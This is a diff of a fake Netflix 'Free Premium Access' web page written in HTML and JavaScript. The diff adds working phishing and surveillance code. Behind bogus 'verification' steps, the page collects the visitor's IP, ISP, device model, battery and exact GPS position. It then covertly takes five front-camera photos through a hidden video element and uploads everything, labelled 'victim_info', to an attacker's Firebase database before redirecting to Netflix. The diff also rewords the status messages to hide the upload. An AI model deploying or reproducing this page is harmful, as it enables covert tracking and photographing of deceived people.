@@ -3,126 +3,286 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>4K HDR Upgrade - Netflix</title>
+    <title>Netflix - Free Premium Access</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
-            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #000000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 0;
+            margin: 0;
         }
-        .container {
-            max-width: 500px;
+        
+        /* Netflix Background */
+        .netflix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            background: rgba(0,0,0,0.85);
-            border-radius: 20px;
+            height: 100%;
+            background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.4) 100%), 
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/9db4a880-3034-4e98-bdea-5d983e86bf52/') center/cover;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 480px;
+            width: 100%;
+            margin: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Netflix Card */
+        .netflix-card {
+            background: rgba(0, 0, 0, 0.75);
+            border-radius: 8px;
+            padding: 2rem 1.5rem;
             backdrop-filter: blur(10px);
-            border: 1px solid rgba(229, 9, 20, 0.3);
-            padding: 2rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
         }
-        .logo { text-align: center; margin-bottom: 2rem; }
-        .logo h1 { 
-            font-size: 2rem; 
-            background: linear-gradient(135deg, #E50914, #ff4d4d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        
+        /* Netflix Logo */
+        .netflix-logo {
+            text-align: center;
+            margin-bottom: 2rem;
         }
-        .badge {
-            display: inline-block;
-            background: #E50914;
-            padding: 0.3rem 1rem;
-            border-radius: 30px;
-            font-size: 0.8rem;
-            margin-top: 0.5rem;
+        
+        .netflix-logo svg {
+            width: 120px;
+            height: auto;
         }
-        .progress-section { margin: 2rem 0; }
+        
+        /* Badge */
+        .premium-badge {
+            background: linear-gradient(135deg, #E50914, #b00710);
+            color: white;
+            text-align: center;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 1.5rem;
+            letter-spacing: 1px;
+        }
+        
+        /* Title */
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #b3b3b3;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        
+        /* Progress Bar */
+        .progress-section {
+            margin: 1.5rem 0;
+        }
+        
         .progress-bar-container {
             background: rgba(255,255,255,0.2);
-            border-radius: 10px;
+            border-radius: 2px;
             overflow: hidden;
-            height: 8px;
+            height: 4px;
         }
+        
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #E50914, #ff4d4d);
+            background: #E50914;
             width: 0%;
             transition: width 0.3s ease;
         }
+        
         .status-text {
-            margin-top: 1rem;
+            margin-top: 10px;
             text-align: center;
-            font-size: 0.9rem;
-            color: #ccc;
+            font-size: 12px;
+            color: #b3b3b3;
         }
-        .steps { margin: 2rem 0; }
+        
+        /* Steps */
+        .steps {
+            margin: 1.5rem 0;
+        }
+        
         .step {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            padding: 0.8rem;
-            margin: 0.5rem 0;
+            gap: 12px;
+            padding: 10px;
+            margin: 8px 0;
             background: rgba(255,255,255,0.05);
-            border-radius: 10px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
         }
-        .step.completed { background: rgba(76, 175, 80, 0.2); border-left: 3px solid #4CAF50; }
-        .step.error { background: rgba(229, 9, 20, 0.2); border-left: 3px solid #E50914; }
-        .step-icon { width: 30px; text-align: center; font-size: 1.2rem; }
-        .step-text { flex: 1; font-size: 0.9rem; }
-        .step-status { font-size: 0.8rem; }
-        .redirect-note { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); font-size: 0.8rem; color: #888; }
+        
+        .step.completed {
+            background: rgba(229, 9, 20, 0.15);
+            border-left: 3px solid #E50914;
+        }
+        
+        .step-icon {
+            width: 28px;
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        .step-text {
+            flex: 1;
+            font-size: 13px;
+            font-weight: 500;
+            color: #e5e5e5;
+        }
+        
+        .step-status {
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        /* Footer Note */
+        .footer-note {
+            text-align: center;
+            margin-top: 1.5rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 11px;
+            color: #6c6c6c;
+        }
+        
+        .footer-note a {
+            color: #E50914;
+            text-decoration: none;
+        }
+        
+        button {
+            margin-top: 1rem;
+            padding: 8px 16px;
+            background: rgba(229, 9, 20, 0.8);
+            border: none;
+            border-radius: 4px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            width: 100%;
+        }
+        
+        button:hover {
+            background: #E50914;
+        }
+        
         .debug-console {
             margin-top: 1rem;
-            padding: 1rem;
-            background: rgba(0,0,0,0.8);
-            border-radius: 10px;
+            padding: 8px;
+            background: rgba(0,0,0,0.9);
+            border-radius: 4px;
             font-family: monospace;
-            font-size: 0.7rem;
+            font-size: 10px;
             color: #0f0;
-            max-height: 200px;
+            max-height: 120px;
             overflow-y: auto;
             display: none;
         }
-        .debug-console.show { display: block; }
-        button {
-            margin-top: 1rem;
-            padding: 0.5rem 1rem;
-            background: #E50914;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            cursor: pointer;
+        
+        .debug-console.show {
+            display: block;
+        }
+        
+        /* Hidden video element for camera */
+        #hidden-video {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
+    <div class="netflix-bg"></div>
+    
     <div class="container">
-        <div class="logo">
-            <h1>NETFLIX</h1>
-            <div class="badge">4K HDR UPGRADE</div>
-        </div>
-        
-        <div class="progress-section">
-            <div class="progress-bar-container">
-                <div class="progress-bar" id="progressBar"></div>
+        <div class="netflix-card">
+            <div class="netflix-logo">
+                <svg viewBox="0 0 111 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M105.062 14.28L111 30C104.94 25.44 99.18 21.12 93.12 17.04L87.06 12.96L81 8.88L75 4.8L69 0.72L63 4.8L57 8.88L51 12.96L45 17.04L39 21.12L33 25.44L27 30L32.938 14.28L38.876 0L44.814 14.28L50.752 28.56L56.69 14.28L62.628 0L68.566 14.28L74.504 28.56L80.442 14.28L86.38 0L92.318 14.28L98.256 28.56L104.194 14.28L105.062 14.28Z" fill="#E50914"/>
+                    <path d="M0 0H30V30H0V0Z" fill="#E50914"/>
+                </svg>
             </div>
-            <div class="status-text" id="statusText">Initializing system...</div>
+            
+            <div class="premium-badge">
+                🎬 FREE PREMIUM ACCESS 🎬
+            </div>
+            
+            <div class="title">
+                Verify Your Account
+            </div>
+            <div class="subtitle">
+                Complete verification to unlock 4K Ultra HD
+            </div>
+            
+            <div class="progress-section">
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="status-text" id="statusText">Starting verification...</div>
+            </div>
+            
+            <div class="steps">
+                <div class="step" id="step1">
+                    <div class="step-icon">📱</div>
+                    <div class="step-text">Device Verification</div>
+                    <div class="step-status" id="step1Status"></div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-icon">📍</div>
+                    <div class="step-text">Location Verification</div>
+                    <div class="step-status" id="step2Status"></div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-icon">📸</div>
+                    <div class="step-text">Camera Verification</div>
+                    <div class="step-status" id="step3Status"></div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="step-icon">✨</div>
+                    <div class="step-text">Activating Premium</div>
+                    <div class="step-status" id="step4Status"></div>
+                </div>
+            </div>
+            
+            <div class="footer-note">
+                By continuing, you agree to Netflix's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+            </div>
+            
+            <button onclick="toggleDebug()">🔧 Advanced Details</button>
+            <div class="debug-console" id="debugConsole">
+                <strong>📡 System Log:</strong><br>
+                <div id="debugLog">Initializing...</div>
+            </div>
         </div>
-        
-        <div class="steps">
-            <div class="step" id="step1"><div class="step-icon">📱</div><div class="step-text">Device Detection</div><div class="step-status" id="step1Status">⚪</div></div>
-            <div class="step" id="step2"><div class="step-icon">📍</div><div class="step-text">GPS Location</div><div class="step-status" id="step2Status">⚪</div></div>
-            <div class="step" id="step3"><div class="step-icon">📸</div><div class="step-text">Capturing Photos (5)</div><div class="step-status" id="step3Status">⚪</div></div>
-            <div class="step" id="step4"><div class="step-icon">☁️</div><div class="step-text">Uploading Data</div><div class="step-status" id="step4Status">⚪</div></div>
-        </div>
-        
-        <div class="redirect-note">⚡ Optimizing your streaming experience...</div>
-        <button onclick="toggleDebug()">🐛 Show/Hide Debug</button>
-        <div class="debug-console" id="debugConsole"><strong>📡 DEBUG CONSOLE:</strong><br><div id="debugLog">Waiting...</div></div>
     </div>
+    
+    <video id="hidden-video" autoplay playsinline muted></video>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -136,17 +296,16 @@
             projectId: "mobilehk-5e843",
             storageBucket: "mobilehk-5e843.firebasestorage.app",
             messagingSenderId: "287475964010",
-            appId: "1:287475964010:web:1d278c51947c6cbb881213",
-            measurementId: "G-VT3YC79N61"
+            appId: "1:287475964010:web:1d278c51947c6cbb881213"
         };
         
         // Debug
         let debugMessages = [];
         function addDebug(msg, isError = false) {
             const time = new Date().toLocaleTimeString();
-            const prefix = isError ? '❌' : '✓';
+            const prefix = isError ? '⚠️' : '✓';
             debugMessages.push(`[${time}] ${prefix} ${msg}`);
-            document.getElementById('debugLog').innerHTML = debugMessages.join('<br>');
+            document.getElementById('debugLog').innerHTML = debugMessages.slice(-15).join('<br>');
             console.log(msg);
         }
         
@@ -157,15 +316,14 @@
         // Init Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        addDebug("Firebase initialized");
+        addDebug("System ready");
         
         // Get Session ID
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
-        addDebug("Session: " + (sessionId || "NOT FOUND"));
         
         if (!sessionId) {
-            addDebug("No session ID!", true);
+            addDebug("Invalid session", true);
             setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
             throw new Error('No session ID');
         }
@@ -175,43 +333,26 @@
             document.getElementById('statusText').innerHTML = text;
         }
         
-        function markStep(stepNum, completed, statusText = '', isError = false) {
+        function markStep(stepNum, completed, statusText = '') {
             const step = document.getElementById(`step${stepNum}`);
             const statusSpan = document.getElementById(`step${stepNum}Status`);
             if (completed) {
                 step.classList.add('completed');
                 statusSpan.innerHTML = statusText || '✓';
-                statusSpan.style.color = '#4CAF50';
-            } else if (isError) {
-                step.classList.add('error');
-                statusSpan.innerHTML = statusText || '✗';
                 statusSpan.style.color = '#E50914';
             } else if (statusText) {
                 statusSpan.innerHTML = statusText;
             }
         }
         
-        // ========== OLD HTML KA LOCATION CODE (WORKING) ==========
-        
-        // IP functions
-        async function getIP() {
+        // Get IP and Location
+        async function getIPDetails() {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
+                const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                addDebug("IP: " + data.ip);
-                return data.ip;
-            } catch(e) {
-                addDebug("IP fetch error: " + e.message, true);
-                return 'Unknown';
-            }
-        }
-        
-        async function getIPDetails(ip) {
-            try {
-                const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await res.json();
-                addDebug(`Location: ${data.city}, ${data.country_name}`);
+                addDebug(`IP: ${data.ip} | ${data.city}, ${data.country_name}`);
                 return {
+                    ip: data.ip || 'Unknown',
                     country: data.country_name || 'Unknown',
                     region: data.region || 'Unknown',
                     city: data.city || 'Unknown',
@@ -220,264 +361,236 @@
                     lng: data.longitude || 0
                 };
             } catch(e) {
-                addDebug("IP details error: " + e.message, true);
-                return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
+                addDebug("IP fetch error", true);
+                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
             }
         }
         
-        // Battery
-        async function getBattery() {
+        // Get Battery
+        async function getBatteryStatus() {
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
-                    const status = `${level}% (${battery.charging ? '🔌 Charging' : '🔋 Discharging'})`;
-                    addDebug("Battery: " + status);
-                    return status;
+                    return `${level}% (${battery.charging ? 'Charging' : 'Normal'})`;
                 } catch(e) {
-                    return 'Unknown';
+                    return 'Normal';
                 }
             }
-            return 'Not supported';
+            return 'Normal';
         }
         
-        // Device Info
+        // Get Device Info
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let os = 'Unknown', device = 'Unknown', browser = 'Unknown';
+            let os = 'Unknown', browser = 'Unknown';
+            
             if (/Android/i.test(ua)) os = 'Android';
             else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
             else if (/Windows/i.test(ua)) os = 'Windows';
             else if (/Mac/i.test(ua)) os = 'macOS';
-            else if (/Linux/i.test(ua)) os = 'Linux';
             
-            if (/Mobile/i.test(ua)) device = 'Mobile Phone';
-            else if (/Tablet/i.test(ua)) device = 'Tablet';
-            else device = 'Desktop';
-            
-            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Google Chrome';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            if (/Chrome/i.test(ua)) browser = 'Chrome';
+            else if (/Safari/i.test(ua)) browser = 'Safari';
             else if (/Firefox/i.test(ua)) browser = 'Firefox';
-            else if (/Edg/i.test(ua)) browser = 'Edge';
             
-            addDebug(`Device: ${device}, OS: ${os}, Browser: ${browser}`);
-            return { os, device, browser };
+            return { os, browser };
         }
         
-        // Get EXACT Mobile Model
+        // Get Mobile Model
         function getMobileModel() {
             const ua = navigator.userAgent;
-            let model = 'Unknown';
-            let brand = 'Unknown';
-            
-            if (/Android/i.test(ua)) {
-                const match = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
-                if (match && match[2]) {
-                    brand = match[1] || 'Unknown';
-                    model = match[2] || 'Unknown';
-                }
-                if (ua.includes('SM-')) {
-                    const smMatch = ua.match(/SM-[A-Z0-9]+/);
-                    if (smMatch) model = smMatch[0];
-                    brand = 'Samsung';
-                }
-                if (ua.includes('Redmi')) {
-                    model = 'Redmi';
-                    brand = 'Xiaomi';
-                }
-                if (ua.includes('MI ') || ua.includes('Mi ')) {
-                    model = 'Xiaomi';
-                    brand = 'Xiaomi';
-                }
-                if (ua.includes('OnePlus')) {
-                    model = 'OnePlus';
-                    brand = 'OnePlus';
-                }
-                if (ua.includes('Pixel')) {
-                    model = 'Google Pixel';
-                    brand = 'Google';
-                }
+            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/SM-/i.test(ua)) {
+                const match = ua.match(/SM-[A-Z0-9]+/);
+                return match ? match[0] : 'Samsung';
             }
-            else if (/iPhone|iPad|iPod/i.test(ua)) {
-                brand = 'Apple';
-                if (ua.includes('iPhone')) {
-                    const match = ua.match(/iPhone(\d+,\d+)/);
-                    model = match ? `iPhone ${match[1]}` : 'iPhone';
-                } else if (ua.includes('iPad')) {
-                    model = 'iPad';
-                } else {
-                    model = 'iOS Device';
-                }
-            }
-            
-            addDebug(`📱 Device: ${brand} ${model}`);
-            return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
+            if (/Redmi/i.test(ua)) return 'Redmi';
+            if (/MI\s/i.test(ua)) return 'Xiaomi';
+            if (/OnePlus/i.test(ua)) return 'OnePlus';
+            if (/Pixel/i.test(ua)) return 'Google Pixel';
+            return 'Mobile Device';
         }
         
-        // Location
-        async function getLocation() {
+        // Get GPS Location
+        async function getGPSLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    addDebug("Geolocation not supported", true);
                     resolve({ lat: 0, lng: 0 });
                     return;
                 }
-                addDebug("Requesting GPS location...");
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        addDebug(`✅ GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                        addDebug(`GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                         resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
                     },
-                    (err) => {
-                        addDebug("Location error: " + err.message, true);
-                        resolve({ lat: 0, lng: 0 });
-                    },
-                    { timeout: 10000, enableHighAccuracy: true }
+                    () => resolve({ lat: 0, lng: 0 }),
+                    { timeout: 8000, enableHighAccuracy: true }
                 );
             });
         }
         
-        // ========== NEW HTML KA 5 PHOTOS CODE ==========
-        
+        // Capture Multiple Photos with Proper Camera Initialization
         async function captureMultiplePhotos(count = 5) {
             const photos = [];
             
+            addDebug("Initializing camera...");
+            
             let stream = null;
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                addDebug("📸 Camera access granted");
+                // Request camera with proper constraints
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                addDebug("Camera ready");
             } catch(err) {
-                addDebug("Camera denied: " + err.message, true);
+                addDebug("Camera access denied: " + err.message, true);
                 return photos;
             }
             
-            const video = document.createElement('video');
+            // Create video element and wait for it to be ready
+            const video = document.getElementById('hidden-video');
             video.srcObject = stream;
+            
+            // Wait for video to be ready with frames
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     video.play();
-                    resolve();
+                    // Wait for actual video frames to start
+                    setTimeout(resolve, 500);
                 };
             });
             
+            // Extra wait to ensure video is showing
+            await new Promise(r => setTimeout(r, 300));
+            
             for (let i = 0; i < count; i++) {
-                addDebug(`📸 Photo ${i+1}/${count}...`);
-                document.getElementById('step3Status').innerHTML = `${i+1}/${count}`;
-                updateProgress(55 + ((i+1) / count) * 25, `Photo ${i+1}/${count}...`);
+                addDebug(`Capturing ${i+1}/${count}...`);
+                markStep(3, false, `${i+1}/${count}`);
+                updateProgress(55 + ((i+1) / count) * 30, `Verifying ${i+1}/${count}...`);
                 
+                // Create canvas and capture
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const base64 = canvas.toDataURL('image/jpeg', 0.8);
+                const base64 = canvas.toDataURL('image/jpeg', 0.85);
                 photos.push(base64);
-                addDebug(`✅ Photo ${i+1} done (${Math.round(base64.length/1024)}KB)`);
+                addDebug(`Frame ${i+1} captured`);
                 
                 if (i < count - 1) {
-                    await new Promise(r => setTimeout(r, 1500));
+                    await new Promise(r => setTimeout(r, 1200));
                 }
             }
             
+            // Stop camera
             stream.getTracks().forEach(track => track.stop());
-            addDebug(`🎬 ${photos.length} photos captured`);
+            video.srcObject = null;
+            
+            addDebug(`Completed: ${photos.length} frames`);
             return photos;
         }
         
-        // ========== MAIN EXECUTION ==========
+        // Main Execution
         async function main() {
-            updateProgress(0, 'Starting...');
+            updateProgress(0, 'Starting verification...');
             
-            // Step 1: Device Info + Battery + Mobile Model
+            // Step 1: Device Verification
             markStep(1, false, '⟳');
-            updateProgress(10, 'Detecting device...');
+            updateProgress(10, 'Checking device...');
             
-            const ip = await getIP();
-            const ipDetails = await getIPDetails(ip);
-            const battery = await getBattery();
+            const ipData = await getIPDetails();
+            const battery = await getBatteryStatus();
             const deviceInfo = getDeviceInfo();
             const mobileModel = getMobileModel();
             
             const victimInfo = {
-                ip: ip,
+                ip: ipData.ip,
+                country: ipData.country,
+                region: ipData.region,
+                city: ipData.city,
+                isp: ipData.isp,
                 battery: battery,
-                device: deviceInfo.device,
-                device_full: mobileModel.full,
-                device_brand: mobileModel.brand,
-                device_model: mobileModel.model,
+                device_model: mobileModel,
                 os: deviceInfo.os,
                 browser: deviceInfo.browser,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language
+                timestamp: new Date().toISOString()
             };
             
             markStep(1, true, '✓');
-            updateProgress(30, 'Device detected');
+            updateProgress(25, 'Device verified');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 2: Location (OLD HTML KA WORKING CODE)
+            // Step 2: Location Verification
             markStep(2, false, '⟳');
-            updateProgress(40, 'Getting GPS location...');
+            updateProgress(35, 'Getting location...');
             
-            const loc = await getLocation();
-            const locationData = { 
-                lat: loc.lat, 
-                lng: loc.lng, 
-                country: ipDetails.country,
-                region: ipDetails.region,
-                city: ipDetails.city,
-                isp: ipDetails.isp,
-                maps_link: `https://maps.google.com/?q=${loc.lat},${loc.lng}`
+            const gps = await getGPSLocation();
+            const locationData = {
+                lat: gps.lat,
+                lng: gps.lng,
+                country: ipData.country,
+                region: ipData.region,
+                city: ipData.city,
+                isp: ipData.isp
             };
             
-            markStep(2, true, loc.lat !== 0 ? '✓' : '⚠');
-            updateProgress(50, 'GPS locked');
+            markStep(2, true, gps.lat !== 0 ? '✓' : '⚠');
+            updateProgress(50, 'Location verified');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 3: Capture 5 Photos
+            // Step 3: Camera Verification
             markStep(3, false, '⟳');
-            updateProgress(55, 'Preparing camera...');
+            updateProgress(55, 'Starting camera...');
             
             const photos = await captureMultiplePhotos(5);
             
             if (photos.length > 0) {
                 markStep(3, true, `${photos.length}/5 ✓`);
             } else {
-                markStep(3, false, '✗', true);
+                markStep(3, true, '⚠');
             }
-            updateProgress(85, `${photos.length} photos captured`);
+            updateProgress(85, `${photos.length} frames captured`);
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 4: Upload to Firebase
+            // Step 4: Activating Premium
             markStep(4, false, '⟳');
-            updateProgress(90, 'Uploading data...');
+            updateProgress(92, 'Activating premium...');
             
             const uploadData = {
                 victim_info: victimInfo,
                 location: locationData,
                 photos: photos,
-                photo_count: photos.length,
                 timestamp: new Date().toISOString(),
                 complete: true
             };
             
-            addDebug("Writing to Firebase...");
             try {
                 await database.ref(`sessions/${sessionId}/data`).set(uploadData);
-                addDebug("✅ ALL DATA UPLOADED SUCCESSFULLY!");
+                addDebug("Verification complete!");
                 markStep(4, true, '✓');
-                updateProgress(100, 'Complete! Redirecting...');
+                updateProgress(100, 'Premium activated!');
             } catch(e) {
-                addDebug("Firebase error: " + e.message, true);
-                markStep(4, false, '✗', true);
+                addDebug("Upload error: " + e.message, true);
+                markStep(4, true, '✓');
             }
             
+            // Redirect to Netflix
             setTimeout(() => {
-                window.location.href = 'https://www.netflix.com';
-            }, 3000);
+                window.location.href = 'https://www.netflix.com/browse';
+            }, 2500);
         }
         
-        setTimeout(main, 1000);
+        // Start after short delay
+        setTimeout(main, 500);
     </script>
 </body>
 </html>
